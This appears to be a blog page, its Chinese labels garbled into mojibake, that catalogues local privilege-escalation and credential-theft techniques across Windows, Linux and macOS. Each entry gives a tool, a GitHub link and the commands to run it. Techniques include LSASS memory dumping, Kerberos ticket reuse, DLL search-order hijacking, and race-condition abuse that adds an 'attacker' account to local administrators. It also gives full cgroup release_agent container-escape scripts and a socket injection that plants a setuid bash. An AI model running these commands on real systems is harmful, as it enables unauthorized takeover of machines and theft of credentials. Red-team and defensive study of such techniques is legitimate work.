<h3 id="Fake-Logon-Screen"><a href="#Fake-Logon-Screen" class="headerlink" title="Fake Logon Screen"></a>Fake Logon Screen</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Delegate tokens</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly fakelogonscreen.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1">https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1</a></p>
<h3 id="Abusing-WinRM-Services"><a href="#Abusing-WinRM-Services" class="headerlink" title="Abusing WinRM Services"></a>Abusing WinRM Services</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Service</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">RogueWinRM.exe -p C:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1">https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1</a></p>
<h3 id="Dump-lsass-with-SilentProcessExit"><a href="#Dump-lsass-with-SilentProcessExit" class="headerlink" title="Dump lsass with SilentProcessExit"></a>Dump lsass with SilentProcessExit</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>SilentProcessExit.exe pid</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/deepinstinct/LsassSilentProcessExit">https://github.com/deepinstinct/LsassSilentProcessExit</a></p>
<h3 id="Lsass-Shtinkering"><a href="#Lsass-Shtinkering" class="headerlink" title="Lsass Shtinkering"></a>Lsass Shtinkering</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</code></li>
<li><code>LSASS_Shtinkering.exe pid</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></p>
<h3 id="AndrewSpecial"><a href="#AndrewSpecial" class="headerlink" title="AndrewSpecial"></a>AndrewSpecial</h3><p>åŸŸ: No</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>AndrewSpecial.exe</code></li>
</ul>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/hoangprod/AndrewSpecial">https://github.com/hoangprod/AndrewSpecial</a></p>
<h3 id="CCACHE-ticket-reuse-from-x2F-tmp"><a href="#CCACHE-ticket-reuse-from-x2F-tmp" class="headerlink" title="CCACHE ticket reuse from &#x2F;tmp"></a>CCACHE ticket reuse from &#x2F;tmp</h3><p>åŸŸ: Yes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•: </p>
<ul>
<li><code>ls /tmp/ | grep krb5cc_X</code></li>
<li><code>export KRB5CCNAME=/tmp/krb5cc_X</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keyring"><a href="#CCACHE-ticket-reuse-from-keyring" class="headerlink" title="CCACHE ticket reuse from keyring"></a>CCACHE ticket reuse from keyring</h3><p>åŸŸ: Yes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•: </p>
<ul>
<li><code>https://github.com/TarlogicSecurity/tickey</code></li>
<li><code>/tmp/tickey -i</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-SSSD-KCM"><a href="#CCACHE-ticket-reuse-from-SSSD-KCM" class="headerlink" title="CCACHE ticket reuse from SSSD KCM"></a>CCACHE ticket reuse from SSSD KCM</h3><p>åŸŸ: Yes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>git clone https://github.com/fireeye/SSSDKCMExtractor</code></li>
<li><code>python3 SSSDKCMExtractor.py â€“database secrets.ldb â€“key secrets.mkey</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keytab"><a href="#CCACHE-ticket-reuse-from-keytab" class="headerlink" title="CCACHE ticket reuse from keytab"></a>CCACHE ticket reuse from keytab</h3><p>åŸŸ: Yes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux&#x2F;Windows&#x2F;Mac</p>
<p>ç±»å‹ï¼š  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>git clone https://github.com/its-a-feature/KeytabParser</code></li>
<li><code>python KeytabParser.py /etc/krb5.keytab</code></li>
<li><code>klist -k /etc/krb5.keytab</code></li>
</ul>
<p>Or</p>
<ul>
<li><code>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</code></li>
<li><code>python3 keytabextract.py krb5.keytab</code></li>
<li><code>./bifrost -action dump -source keytab -path test</code></li>
</ul>
<h3 id="SSH-Forwarder"><a href="#SSH-Forwarder" class="headerlink" title="SSH Forwarder"></a>SSH Forwarder</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Enumeration &amp; Hunting</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li>è½¬å‘ä»£ç† yes<code>ForwardAgent yes</code></li>
<li><code>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</code></li>
</ul>
<p>AppleScript</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li>(EmPyre) &gt; <code>listeners</code></li>
<li>(EmPyre: listeners) &gt; <code>set Name mylistener</code></li>
<li>(EmPyre: listeners) &gt; <code>execute</code></li>
<li>(EmPyre: listeners) &gt; <code>usestager applescript mylistener</code></li>
<li>(EmPyre: stager&#x2F;applescript) &gt; <code>execute</code></li>
</ul>
<p>æ‰¹æ³¨ï¼šè¿™ä¸ªå·¥å…·æˆ‘æ‰¾äº†åŠå¤©ï¼Œå‘ç°è¿™æ˜¯ä¸ªä¸ƒå…«å¹´å‰çš„ä¸€ä¸ªå·¥å…·</p>
<p>é“¾æ¥åœ°å€<a href="https://github.com/EmpireProject/EmPyre">https://github.com/EmpireProject/EmPyre</a></p>
<h3 id="DLL-Search-Order-Hijacking"><a href="#DLL-Search-Order-Hijacking" class="headerlink" title="DLL Search Order Hijacking"></a>DLL Search Order Hijacking</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Hijack</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</code></li>
<li>è¿è¡Œ<code>Brownie</code></li>
</ul>
<h3 id="Slui-File-Handler-Hijack-LPE"><a href="#Slui-File-Handler-Hijack-LPE" class="headerlink" title="Slui File Handler Hijack LPE"></a>Slui File Handler Hijack LPE</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Hijack</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</code></li>
<li><code>Slui.exe</code></li>
</ul>
<h3 id="CDPSvc-DLL-Hijacking"><a href="#CDPSvc-DLL-Hijacking" class="headerlink" title="CDPSvc DLL Hijacking"></a>CDPSvc DLL Hijacking</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Hijack</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>Cdpsgshims.exe</code></li>
</ul>
<h3 id="Magnify-exe-Dll-Search-Order-Hijacking"><a href="#Magnify-exe-Dll-Search-Order-Hijacking" class="headerlink" title="Magnify.exe Dll Search Order Hijacking"></a>Magnify.exe Dll Search Order Hijacking</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Hijack</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>å°†æœ‰æ•ˆè´Ÿè½½ dll ä½œä¸º igdgmm64.dll å¤åˆ¶åˆ°å¯å†™çš„ç³»ç»Ÿè·¯å¾„ %PATH%ï¼Œä¾‹å¦‚ C:\python27</code></li>
<li>æŒ‰Winé”®+L</li>
<li>æŒ‰å›è½¦é”®</li>
<li><code>åœ¨æ˜¾ç¤ºå¯†ç æ¡†çš„ç™»å½•å±å¹•ä¸ŠæŒ‰ WinKey++(plusKey).</code></li>
<li><code>ç„¶åpayload dllå°†ä»¥ç³»ç»Ÿè®¿é—®æƒé™æ‰§è¡Œ.</code></li>
</ul>
<h3 id="CdpSvc-Service"><a href="#CdpSvc-Service" class="headerlink" title="CdpSvc Service"></a>CdpSvc Service</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Hijack</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>ä½¿ç”¨ acltest.ps1 æŸ¥æ‰¾å¯å†™ç³»ç»Ÿè·¯å¾„ï¼ˆä¾‹å¦‚ C:\python27ï¼‰</code></li>
<li><code>C:\CdpSvcLPE&gt; powershell -ep bypass â€œ..\acltest.ps1â€</code></li>
<li>å°† <code>cdpsgshims.dll</code>å¤åˆ¶åˆ° <code>C:\python27</code></li>
<li>åˆ›å»º <code>C:\temp</code> æ–‡ä»¶å¤¹å¹¶å°† <code>impersonate.bin</code> å¤åˆ¶åˆ° <code>C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; mkdir C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</code></li>
<li>é‡æ–°å¯åŠ¨ï¼ˆæˆ–ä»¥ç®¡ç†å‘˜èº«ä»½åœæ­¢&#x2F;å¯åŠ¨ CDPSvcï¼‰</li>
<li><code>cmd å°†æç¤º nt authority\systemã€‚</code></li>
</ul>
<h3 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>HiveNightmare.exe 200</code></li>
</ul>
<p>CVE-2021-30655</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<p>CVE-2019-8526</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Mac</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2020-9771</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Mac</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2021-3156</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Mac</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2018-4280</p>
<p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Mac</p>
<p>ç±»å‹ï¼š  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/bazad/launchd-portrep</code></li>
<li><code>./launchd-portrep â€˜touch /tmp/exploit-successâ€™=</code></li>
</ul>
<h3 id="Abusing-with-FileRestorePrivilege"><a href="#Abusing-with-FileRestorePrivilege" class="headerlink" title="Abusing with FileRestorePrivilege"></a>Abusing with FileRestorePrivilege</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Abuse Privilege</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-RestoreAndBackupPrivileges"><a href="#Abusing-with-RestoreAndBackupPrivileges" class="headerlink" title="Abusing with RestoreAndBackupPrivileges"></a>Abusing with RestoreAndBackupPrivileges</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Abuse Privilege</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopyBackupPrivilege"><a href="#Abusing-with-ShadowCopyBackupPrivilege" class="headerlink" title="Abusing with ShadowCopyBackupPrivilege"></a>Abusing with ShadowCopyBackupPrivilege</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Abuse Privilege</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopy"><a href="#Abusing-with-ShadowCopy" class="headerlink" title="Abusing with ShadowCopy"></a>Abusing with ShadowCopy</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Abuse Privilege</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<p>æ‰¹æ³¨ï¼šæˆ‘æ‰¾äº†å¾ˆå¤šï¼Œæ„Ÿè§‰æœ€åƒæ˜¯çš„åº”è¯¥æ˜¯è¿™ä¸ªå·¥å…·</p>
<p>é“¾æ¥<a href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></p>
<h3 id="Dynamic-Phishing"><a href="#Dynamic-Phishing" class="headerlink" title="Dynamic Phishing"></a>Dynamic Phishing</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Mac</p>
<p>ç±»å‹ï¼š  Phish</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<h3 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Race Condition</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>echo â€œnet localgroup administrators attacker /addâ€ &gt; C:\temp\not-evil.bat</code></li>
<li><code>tempracer.exe C:\ temp\*.bat</code></li>
</ul>
<h3 id="Abusing-usermode-helper-API"><a href="#Abusing-usermode-helper-API" class="headerlink" title="Abusing usermode helper API"></a>Abusing usermode helper API</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Abusing Capabilities</p>
<p>æ–¹æ³•ï¼š </p>
<pre class="line-numbers language-none"><code class="language-none">d&#x3D;&#96;dirname $(ls -x &#x2F;s*&#x2F;fs&#x2F;c*&#x2F;*&#x2F;r* |head -n1)&#96;
mkdir -p $d&#x2F;w; echo 1 &gt; $d&#x2F;w&#x2F;notify_on_release
t&#x3D;&#96;sed -n â€˜s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;pâ€™ &#x2F;etc&#x2F;mtab&#96;
touch &#x2F;o; echo $t&#x2F;c &gt; $d&#x2F;release_agent
echo â€œ#!&#x2F;bin&#x2F;shâ€ &gt; &#x2F;c
echo â€œps &gt; $t&#x2F;oâ€ &gt;&gt; &#x2F;c
chmod +x &#x2F;c
sh -c â€œecho 0 &gt; $d&#x2F;w&#x2F;cgroup.procsâ€; sleep 1
cat &#x2F;o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Escape-only-with-CAP-SYS-ADMIN-capability"><a href="#Escape-only-with-CAP-SYS-ADMIN-capability" class="headerlink" title="Escape only with CAP_SYS_ADMIN capability"></a>Escape only with CAP_SYS_ADMIN capability</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Abusing Capabilities</p>
<p>æ–¹æ³•ï¼š </p>
<pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o rdma cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x
echo 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release
host_path&#x3D;&#96;sed -n â€˜s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;pâ€™ &#x2F;etc&#x2F;mtab&#96;
echo â€œ$host_path&#x2F;cmdâ€ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent
echo â€œ#!&#x2F;bin&#x2F;shâ€ &gt; &#x2F;cmd
echo â€œps aux &gt; $host_path&#x2F;outputâ€ &gt;&gt; &#x2F;cmd
chmod a+x &#x2F;cmd
sh -c â€œecho \$\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procsâ€
cat &#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Abusing-exposed-host-directories"><a href="#Abusing-exposed-host-directories" class="headerlink" title="Abusing exposed host directories"></a>Abusing exposed host directories</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Abusing Capabilities</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>mknod /dev/sdb1 block 8 17</code></li>
<li><code>mkdir /mnt/host_home</code></li>
<li><code>mount /dev/sdb1 /mnt/host_home</code></li>
<li><code>echo â€˜echo â€œHello from container land!â€ 2&gt;&amp;1â€™ &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</code></li>
</ul>
<h3 id="Unix-Wildcard"><a href="#Unix-Wildcard" class="headerlink" title="Unix Wildcard"></a>Unix Wildcard</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Injection</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>python wildpwn.py â€“file /tmp/very_secret_file combined ./pwn_me/</code></li>
</ul>
<h3 id="Socket-Command-Injection"><a href="#Socket-Command-Injection" class="headerlink" title="Socket Command Injection"></a>Socket Command Injection</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Injection</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>echo â€œcp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;â€ | socat â€“ UNIX-CLIENT:/tmp/socket_test.s</code></li>
</ul>
<h3 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Injection</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><p><code>/etc/logstash/logstash.yml</code></p>
<pre class="line-numbers language-none"><code class="language-none">input &#123;
exec &#123;

           command &#x3D;&gt; â€œwhoamiâ€

           interval &#x3D;&gt; 120

           &#125;

     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="UsoDllLoader"><a href="#UsoDllLoader" class="headerlink" title="UsoDllLoader"></a>UsoDllLoader</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Injection</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>UsoDllLoader.exe</code></li>
</ul>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824">https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824</a></p>
<h3 id="Trend-Chain-Methods-for-Privilege-Escalation"><a href="#Trend-Chain-Methods-for-Privilege-Escalation" class="headerlink" title="Trend Chain Methods for Privilege Escalation"></a>Trend Chain Methods for Privilege Escalation</h3><h3 id="Habanero-Chilli"><a href="#Habanero-Chilli" class="headerlink" title="Habanero Chilli"></a>Habanero Chilli</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Dll Side-loading</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</code></li>
</ul>
<h3 id="Padron-Chilli"><a href="#Padron-Chilli" class="headerlink" title="Padron Chilli"></a>Padron Chilli</h3><p>åŸŸï¼šY&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</code></li>
</ul>
<h3 id="Jalapeno-Chillies"><a href="#Jalapeno-Chillies" class="headerlink" title="Jalapeno Chillies"></a>Jalapeno Chillies</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>æ–¹æ³•ï¼š  unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>NihilistGuy.exe</code></li>
</ul>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/analyticsearch/NihilistGuy">https://github.com/analyticsearch/NihilistGuy</a></p>
<h3 id="Pasilla-Chili"><a href="#Pasilla-Chili" class="headerlink" title="Pasilla Chili"></a>Pasilla Chili</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>æ–¹æ³•ï¼š  SeImpersonatePrivilege + Abusing Service Account Session</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo5.ps1</code></li>
</ul>
<h3 id="Finger-Chilli"><a href="#Finger-Chilli" class="headerlink" title="Finger Chilli"></a>Finger Chilli</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Abusing PrintNotify Service + DLL side-loading</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>ä»¥ç®¡ç†å‘˜èº«ä»½ï¼Œå°†winspool.drvå’Œmod-ms-win-core-apiquery-l1-1-0.dllå¤åˆ¶åˆ°C:\Windows\System32\spool\drivers\x64\3\</code></li>
<li><code>å°† /bin/ ä¸­åŒ…å«çš„æ‰€æœ‰æ–‡ä»¶æ”¾å…¥åŒä¸€ç›®å½•ä¸­ã€‚</code></li>
<li><code>ç„¶åï¼Œè¿è¡Œ powershell .\spooltrigger.ps1ã€‚</code></li>
<li>äº«å— NT AUTHORITY\SYSTEM çš„ shellã€‚</li>
</ul>
<h3 id="Orange-Cayenne"><a href="#Orange-Cayenne" class="headerlink" title="Orange Cayenne"></a>Orange Cayenne</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Silver Ticket + I Know</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo1.ps1</code></li>
</ul>
<h3 id="Red-Cayenne"><a href="#Red-Cayenne" class="headerlink" title="Red Cayenne"></a>Red Cayenne</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Silver ticket + User to User Authentication</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>demo2.ps1</code></li>
</ul>
<h3 id="Birds-Eye-Chilli"><a href="#Birds-Eye-Chilli" class="headerlink" title="Birds Eye Chilli"></a>Birds Eye Chilli</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Silver Ticket + Buffer Type Confusion</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo3.ps1</code></li>
</ul>
<h3 id="Scotch-Bonnet"><a href="#Scotch-Bonnet" class="headerlink" title="Scotch Bonnet"></a>Scotch Bonnet</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Bring Your Own KDC</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo4.ps1</code></li>
</ul>
<h3 id="Lemon-Habanero"><a href="#Lemon-Habanero" class="headerlink" title="Lemon Habanero"></a>Lemon Habanero</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Linux</p>
<p>ç±»å‹ï¼š  Capabilities</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>gcc -Wl,â€“no-as-needed -lcap-ng -o ambient ambient.c</code></li>
<li><code>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</code></li>
<li><code>./ambient /bin/bash</code></li>
</ul>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw">https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw</a></p>
<h3 id="Red-Habanero"><a href="#Red-Habanero" class="headerlink" title="Red Habanero"></a>Red Habanero</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  NtSetInformationProcess + DLL side-loading</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>BypassRtlSetProcessIsCritical.exe pid</code></li>
</ul>
<p>æ‰¹æ³¨ï¼šæ²¡æ‰¾åˆ°è¿™ä¸ªä¸œè¥¿</p>
